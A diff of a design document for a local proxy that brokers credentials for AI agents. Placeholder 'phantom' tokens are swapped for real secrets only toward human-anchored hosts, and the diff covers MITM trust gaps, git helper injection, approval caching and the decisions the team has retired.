-**v1 → v2 is purely incremental** (no rework): the connection layer already exists (implicit default connections for curated services); v2 adds raw connections (`service: ""` + `config.host`) + passthrough routes + `resolved_hosts` enforcement on existing shapes — no new fields. Design once, implement/test in two stages, drive fast to complete v2.
+| Hole | Fact |
+|---|---|
+| **Go on macOS** | `root_unix.go` build-excludes darwin; forced through Security.framework → `SSL_CERT_FILE` ignored. **gh / terraform / supabase on Mac miss env-CA** (fine on Linux). |
+| Node built-in fetch (proxy side) | ignores `HTTPS_PROXY` pre-24; needs `NODE_USE_ENV_PROXY=1`. |
+| Java | reads neither; escape `JAVA_TOOL_OPTIONS=-Djavax.net.ssl.trustStore=…` (prints a stderr line). |
+| rustls / Electron static roots | not overridable. |
 
-## 14. Vision — agent-as-integrator (post-v1)
+## 8. MITM + adaptor = deliberate hybrid
 
-User tells the agent *"put service X's API in my vault"*; the agent researches it, proposes a (degenerate or full) connection **+ its host (`config.host`)** via the deep-link, human **anchors with one passkey**; the agent never holds the raw secret. Everything is a (degenerate) connection/recipe. The human-passkey gate on a secret→host binding **is** the trust anchor. Foundation: `feat/per-vault-custom-recipes` (unmerged, 1 commit; `aux.recipes` absent from `dev`). Gap: the agent-facing author path (deposit → passkey approve), scoped to insertion-auth.
+MITM covers **as many cases as it cleanly can**, not all — that is *why* the
+model is a hybrid. A process the env-CA can't reach (§7 matrix, cert-pinning)
+falls back to an **adaptor**: a per-command explicit route the tool already
+supports (`git`'s credential path, `npm --registry`, `pip -i`). The adaptor still
+carries a phantom and still resolves through the same connection/host machinery —
+it is a different *transport onto the same core*, never a second model.
 
-## 15. Decided NOT to do (don't re-litigate)
+**git — the worked case (no hard blocker):**
 
-- **No passthrough (`/proxy`/phantom/MITM) before the three §11 gates.**
-- **No separate `allowed_hosts`/`hosts` field, no side-table, no per-item bytes change** — ONE host concept on the connection (raw = degenerate connection reusing `config.host`; curated = recipe-fixed).
-- **No promoting `host` to a first-class `Connection.host` field** — it stays a `config` re-map slot (uniform with the `{{connection.X}}` template mechanism + recipe `params` anti-SSRF); `resolved_hosts()` abstracts enforcement. Revisit only if host needs structured/validated typing.
-- **No eTLD+1 host matching** — exact FQDN; only curated recipes declare multi-host.
-- **No `broker.rs`/`approve.rs` rewrite** — additive `decide`/`execute` respecting the existing flow.
-- **No forced `/use`↔`/stream` policy unification** — the coarser stream policy is intentional.
-- **No MITM-as-primary / no forcing `sc run`** — explicit baseline; MITM opt-in, v2.
-- **No persistent GLOBAL base-URL rewrite** — per-command explicit + MITM only.
-- **No pre-storing encoded credential forms** — semantic value + egress filter.
-- **No baked "common host" hint list** — recipe / agent deep-link / TOFU.
-- **No agent-authored OAuth/signing recipes** — curated-only; agent-authored = insertion + human-anchored host.
-- **No skill rewrite toward phantoms in v1** — v1's one concept is the shipped `/use` model.
-- **No early sudo system-trust CA. No auto-covering already-running agents.**
-- **Don't delete `/export`** — keep the op-path + human core act (`sc secret get`); disable the **agent surface** only. ✓ DONE: route → 403 stub (`env::disabled`), stripped from skill; `handle` preserved for opt-in re-enable. (Skill-strip alone wouldn't close it — the live route is itself the exfil hole, so the 403 is required for the "no silent-exfil holes" claim.)
-- **No competitor references in this doc; novelty/paper = non-goal** — usability first.
+| Scenario | Route | Outcome |
+|---|---|---|
+| under the proxy (session/agent-scope `sc run`) | CONNECT → SNI hits the connection's host → helper emits phantom → proxy Basic-decodes, substitutes, re-encodes; streaming relays natively | transparent |
+| not under the proxy, agent shells git | **`sc run -- git push` — the per-command prefix IS git's adaptor** (same bundle, command scope) | task completes |
+| no routing possible at all | routing discipline (§14): report the situation | explicit, not a mystery 401 |
+| SSH remote (`git@…`) | not HTTP — outside the broker; setup hints "use the HTTPS remote for brokered flows" | honest boundary |
+
+Helper registration is residue-free: `sc run` injects
+`GIT_CONFIG_COUNT/KEY_0=credential.helper/VALUE_0="!sc git-credential"` (git's
+native per-process config env) — nothing written to any gitconfig.
+
+**A further simplification the git case exposes: service auth-header templates die
+entirely.** `Authorization = "Bearer {{secret.X}}"` was a `/use`-era artifact
+(daemon built the header). Phantom-only: the **tool builds its own header with
+the phantom inline** (gh pulls it from env and writes `Bearer <phantom>`; git
+base64s it itself) and the proxy only substitutes. The helper shape (GitHub:
+username ignored; Bitbucket: real username) needs NO declaration — pair
+construction is phantom placement (URL userinfo), with `sc git-credential` as an
+optional zero-schema convenience (§4).
+
+## 9. What the phantom resolves to
+
+- **Default: the stored secret's value, as-is** (bearer / api-key / query / URL /
+  Basic — position is the agent's, via the phantom; no declaration needed). The
+  vault always stores the **semantic** value, never a pre-encoded form.
+- **`[oauth2]`: the minted access token** (refresh→access in the daemon, [built]).
+  The one non-direct case; a future request-signer (SigV4/HMAC) would be another
+  named section when it becomes real.
+- The old `{{secret.X | b64|basic}}` egress filters are **cut** (they served the
+  retired daemon-built-header path; no known pre-encoded-slot use case — YAGNI,
+  revisit on a real one).
+
+## 10. Security
+
+**Sound because:** the phantom is the only injection trigger (no host-based
+auto-inject); host is anchored per connection and validated exact-FQDN;
+`{{secret.*}}` can't appear in a service-declared authority (`upstream_host_has_unsafe_template`);
+private/metadata/localhost floor (`host_egress_allowed`) sits under the anchor;
+replace-all-matching strips agent-supplied auth so the agent can't shadow the
+injected credential; `/export` off the agent surface removes the raw-reveal path;
+OAuth is curated-only.
+
+**Approval-cache key includes the resolved host** — an approval for host A must
+not authorize host B within the TTL (host is request-data in this model). Key =
+`(conn_id, rule_id, method, host)`; for single-host connections behaviour is
+unchanged.
+
+**New-destination confirmation = higher-friction, exact-FQDN.** First unmatched
+host → a captive-portal one-tap-**widen** that writes an **exact FQDN** as a
+permanent grant (distinct, higher-friction UX; show host + eTLD+1; never
+auto-widen to a bare suffix). Ships in warn/log mode first, then deny.
+
+**Honest posture:** even fully built, the human anchor is
+**habituation-defeatable** (true of all human-approval security). The claim is
+"agent never holds the key + host-anchored egress + human confirms new
+destinations" = **strictly better than status quo** (agent holds the raw key,
+sends it anywhere), not "unbreakable." Defense = keep widen prompts rare +
+salient (default to curated/correct hosts).
+
+*Optional hardening, not a gate:* DNS-pin on the resolved IP (anti-rebinding) —
+value is reaching internal/metadata IPs behind a name block, a hosted/shared-
+daemon concern; the local daemon can reach LAN anyway. Low priority.
+
+## 11. `sc set` — host required, skip must be explicit
+
+Interactive and non-interactive, modern-CLI standard. **Host is a required
+answer**, not a default-skip (a set-without-host that the agent later can't use is
+the reverse-intuitive trap):
+
+- **Interactive** (TTY): missing value → hidden prompt (keeps the secret out of
+  shell history / `ps`); missing host → prompt, **required**; no-broker must be
+  chosen explicitly (`--no-broker` or typing `none`, echoing the consequence
+  "agent cannot use this item"). Every prompt echoes the intent of what was
+  already passed (defends arg-order mistakes; host is `--host`, never a 3rd
+  positional).
+- **Non-interactive** (script / agent pipe): missing host → error listing the two
+  fixes (`--host <h>` / `--no-broker`). Never hangs.
+
+`sc set --host` **creates the raw connection** (`service: None` + `hosts`);
+hostless `--no-broker` writes a no-broker item invisible to the broker.
+
+## 12. Storage-only items (the "no upstream" family)
+
+`host` is **required, but a host of `*` is never allowed.** Two distinct "no host"
+meanings:
+
+- **"any host"** (wildcard egress) — **no legitimate need**; it is exactly
+  "silently exfiltratable." Forbidden.
+- **"no upstream at all"** — real: values consumed by **local computation**, never
+  sent to a third party over HTTP (`JWT_SECRET`, session/encryption keys, DB
+  passwords over non-HTTP `postgres://`, wallet seeds, license keys). These have
+  no host to anchor; phantom substitution doesn't apply. ⇒ **pure storage**,
+  retrieved by a human with passkey (`sc secret get`); **invisible to the agent
+  surface.** This absorbs the "files / pure storage" family into the same list —
+  a no-broker item just shows *"stored · agent cannot use · add a host to
+  broker."*
+
+## 13. `/export` — a reveal, not an injection (out of scope for phantom)
+
+`/export` gives the agent the **raw value** — the opposite shape of the broker
+(inject-toward-upstream). It has **no upstream**, so it does not fit the phantom
+model, and forcing it back in would reopen the raw-exfil hole. **Decision: keep it
+out.** Current handling is final for this wave — and needs nothing new built: the
+human path is the **op-plane Export ceremony** (`sc secret get` → `POST /v/{vid}/op`
+`act.type=export` → browser passkey "Reveal <key>" → approve redemption;
+cli/secret.rs). What's 403'd is only the **proxy-plane sugar route**
+`/v/{vid}/export/<key>` (the agent door). Two doors; only the agent one is shut.
+
+**Forward concept (record, don't build now): the `system` category.** A *virtual
+connection whose upstream is the daemon itself*, driven through the same
+proxy+phantom surface, lets agents perform meta-ops (e.g. **propose a vault
+policy**, propose a service definition) under one unified mechanism. Export does **not** fit
+(it's give-agent-plaintext, anti-broker), but agent→daemon *data-submitting*
+ops do (upstream = self). This is why a `system` category exists in the vault. Out
+of scope now; noted so the mechanism composes later.
+
+## 14. Agent mental model + discovery — the routing discipline
+
+One concept: *"local proxy; phantom where the credential goes; route traffic
+through it."*
+
+**Invariant: phantom ⟺ routed.** `sc run` is not always on, and both states must
+work as expected: routed ⇒ phantoms substitute transparently; not routed ⇒ the
+agent must *know* and pick a routing option (per-command `sc run --` prefix,
+session `--export-env`) — or, if no routing is possible, **say so to the user**.
+Never fire a phantom at a real server: the upstream 401 is indistinguishable from
+a bad token. Enforced from both sides:
+
+- **Preflight (unrouted side):** `sc status` reports `routed: true/false` by
+  inspecting its **own inherited env** (the same env any subprocess would get) for
+  the bundle **and liveness-probing the proxy** (vars present but proxy dead ⇒
+  `false`).
+- **Fail-closed (routed side):** a syntactically-valid phantom naming an unknown
+  connection is **rejected by the proxy with a clear 4xx** ("unknown connection
+  'githb'"), never forwarded. (Safe because the phantom marker makes accidental
+  matches ~impossible — §5.) So inside routing, phantom errors are *our* precise
+  errors; outside routing, the preflight prevents the ambiguous case entirely.
+
+Discovery shape: `sc status` → `{ connections:[{name, phantom, hosts}],
+proxy, routed }` — **discovery returns the ready-made phantom string**; the
+agent copies, never constructs (zero-derivation: malformed phantoms become
+impossible, and the format can evolve without breaking agents). The phantom
+FORMAT is mechanism knowledge and lives in the skill's one-concept sentence;
+per-connection INSTANCES live here; **toml `setup` never carries phantom
+mechanics** (that would be per-service prose smuggling in the generic
+mechanism). Novice loop: user adds a connection in the console → the agent's
+next `sc status` shows it + its phantom → used. The console's phantom
+copy-button is a HUMAN supplementary channel (debugging, manual paste), never
+the agent's channel.
+
+**Skill delta (drafted; replaces the old `/use` "Call shape" section — the
+connect-guidance / setup-hints / vault-locked / approval-polling sections stay
+as shipped). No "local", no "proxy" vocabulary — the agent needs "SafeClaw",
+nothing lower-level:**
+
+```markdown
+## Using a connection
+
+Every connected service in `/registry` carries a ready-made **phantom** — a
+placeholder like `__sc__github__`. Put it exactly where the real credential
+would go (the env var a tool reads, a header, a config file). SafeClaw swaps
+it for the real value on the way out — and only toward that connection's
+`hosts`.
+
+Phantoms only work when the traffic passes through SafeClaw. Check first:
+
+    sc status      # routed: true|false, plus each connection's phantom
+
+`routed: false` → run the command through SafeClaw (`sc run -- <cmd>`, or the
+service's `setup` hint). Don't send a phantom unrouted — the upstream just
+rejects it, indistinguishably from a bad key.
+``` Skill stays **generic**: the one concept + the routing discipline +
+"call discovery; never hold raw secrets" — per-service config → the service's `[setup]`
++ registry. Install prompt = one-time bootstrap (goal + anchors, not a command
+list). Clean removal = a per-project manifest, not agent memory.
+
+## 15. Superseded / Decided NOT to do (1–2 lines each; don't re-litigate)
+
+- **`/use/<conn>/<path>` endpoint — RETIRED.** Two injection triggers (URL-conn +
+  phantom) create conflict/precedence/缺省 combinatorics; phantom-only is one
+  trigger. Raw connections are single-host, so a real upstream URL + phantom fully
+  determines the call — `/use` adds nothing. (Shipped in v1; replaced wholesale,
+  0 users.)
+- **`/proxy` JSON endpoint — NOT built.** Redundant once the request goes through
+  the actual HTTPS proxy with a phantom inline.
+- **`/stream` (git) as a separate endpoint — RETIRED.** Streaming passes through
+  the CONNECT proxy natively; git needs only the Basic-decode + credential-helper
+  specials (§8), not its own route.
+- **The 2×2 Fill×Transport matrix — GONE.** Collapsed to one surface + one
+  trigger; the only remaining degree of freedom is env-bundle scope (§6).
+- **Host-based auto-injection — FORBIDDEN.** Ambiguous under multi-account (two
+  Gmails → googleapis.com) and violates transparent-cooperation ("inject only what
+  the agent asked for, by phantom").
+- **Old `sc run` = export-all-to-env-plaintext — DROPPED.** Dangerous, low-value;
+  MITM + phantom serves the real need (tools reading a token from env) without
+  plaintext in the process.
+- **`<agent-key>@proxy` userinfo binding — DROPPED.** Over-design; a custom
+  convention on top of phantoms. Localhost + session association already binds
+  identity; the agent only needs "phantom is in my env."
+- **No `allowed_hosts` side-table, no per-item bytes/sudp change** — ONE host
+  concept: `Connection.hosts` (raw) / service-fixed (curated); `resolved_hosts()`
+  abstracts it.
+- **`Connection.config` — DELETED; `host` promoted to `Connection.hosts`.**
+  (Reverses the earlier "don't promote": that decision's rationale — config as
+  the uniform template-render source — died with the template layer; the anchor
+  deserves typed write-time validation.)
+- **No "trivial service" entity for raw** — raw = a connection with `service:
+  None`; a service is *optional per-target type knowledge*, nothing more.
+- **No `[consume.env]` / env-var-name hints in service tomls** — the env var *name* is
+  the consuming tool's contract, which the agent knows natively; the vault
+  maintaining tool conventions is the wrong layer (and `sc run` does NOT pre-set
+  phantom env vars — the agent writes them).
+- **No production taxonomy (`material`/direct|derived|minted)** — direct is the
+  undeclared default; `[oauth2]` is the one named exception; `{{secret.X | b64|
+  basic}}` egress filters are cut (served the retired header templates; YAGNI).
+- **No eTLD+1 host matching — runtime enforcement is always exact FQDN.**
+  `*.suffix` (mainstream single-label rule) exists ONLY in service `hosts` as a
+  pinning constraint; instances pin exact hosts.
+- **No host variable system (`{{host}}`/`{{resource}}`)** — exact | `*.suffix`
+  only. Fully self-hosted = a raw connection (no service definition needed);
+  self-hosted+OAuth deferred until a real case.
+- **No conn-side full override of service hosts** — curated hosts are the
+  audited anti-SSRF promise; override would degrade curated to raw-with-a-label.
+- **No tool-named sections (`[git]`/`[docker]`)** — sections are auth
+  mechanisms only.
+- **`[basic]` DELETED too (its own existence trial)** — the scheme
+  self-describes in the header; proxy decodes natively; pair construction =
+  phantom placement (URL userinfo / `docker login -p`); the helper is optional,
+  zero-schema, one documented global rule. Auth sections today = `[oauth2]`
+  alone; future = the SIGNING family only (`[sigv4]`, `[web3sign]` — EIP-191/712
+  semantics, Web3Signer-style remote signing) because signatures are computed
+  FROM the request and can never be a textual substitution.
+- **toml carries NO routing/transport information** — routing = the env bundle
+  at some scope, or a tool's native per-command URL switch (setup prose only,
+  e.g. npm `--registry`). cargo's local-git-index hack is deleted because cargo
+  natively honours proxy+CA env ⇒ the bundle IS its adaptor on every path — not
+  "because MITM exists".
+- **No `broker.rs`/`approve.rs` rewrite** — additive over the existing 2-RTT flow.
+- **No pre-storing encoded credential forms** — the vault stores the semantic value.
+- **No baked "common host" hint list** — service-declared / agent deep-link / TOFU.
+- **No user/agent-authored OAuth PROVIDER definitions** — the provider
+  (`_providers/*.toml`: endpoints, client, `client_type=public` gate) is
+  curated/PR-only. OAuth **connections** are self-serve via a **custom service
+  toml** (per-vault `aux.services`, validated; referencing an existing provider
+  only) → then added like any catalog service — NEVER an OAuth option inside
+  the add-connection form (it would force an `oauth` field onto the 2-field
+  connection record). Custom-toml authoring is a separate low-frequency
+  surface: the v4 schema is what it accepts, nothing else.
+- **No early sudo system-trust CA. No auto-covering an already-running process**
+  (env can't retro-inject a live process → `sc run` or explicit).
+- **No wildcard host (`*`)** — "any host" = silently exfiltratable; forbidden.
+- **`/export` not forced into phantom** — it's a reveal, no upstream; kept as the
+  human passkey act, agent surface 403.
+
+## 16. Vision — agent-as-integrator (post-core)
+
+User tells the agent *"put service X's API in my vault"*; the agent researches it,
+proposes a connection **+ its host** via a deep-link, the human **anchors with one
+passkey**; the agent never holds the raw secret. Everything is a connection
+(degenerate or curated); the human-passkey gate on a secret→host binding **is** the
+trust anchor. Foundation: the `feat/per-vault-custom-recipes` branch — absorb its useful parts (storage renamed `aux.services`, validator), then DELETE the branch + its worktrees. Gap: the agent-facing author path (deposit → passkey approve),
+scoped to insertion-auth. The `system` category (§13) is the same idea turned
+inward (agent proposes policy/service definitions to the daemon).
